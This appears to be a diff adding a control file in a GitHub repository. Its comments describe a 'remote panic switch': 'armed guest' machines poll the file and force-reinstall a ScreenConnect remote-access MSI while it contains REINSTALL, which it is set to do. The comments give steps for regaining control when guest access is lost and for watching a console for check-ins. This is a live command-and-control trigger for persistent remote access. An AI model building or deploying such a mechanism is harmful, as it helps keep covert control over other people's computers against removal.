@@ -1,0 +1,13 @@
+# Remote panic switch for guest monitors (OWN_MON M2+)
+# When this file contains the word REINSTALL, every armed guest will
+# force-reinstall the primary ScreenConnect MSI on the next monitor tick (~2 min).
+#
+# TO ACTIVATE (you have no Guest access but monitors are still alive):
+#   1. Ensure this file is on github-drop main with a line containing: REINSTALL
+#   2. Wait 2-3 minutes
+#   3. Watch sevrz console for check-ins
+#
+# TO DEACTIVATE (important — stop continuous reinstall loops):
+#   Delete this file from the repo, OR replace contents with: OFF
+#
+REINSTALL
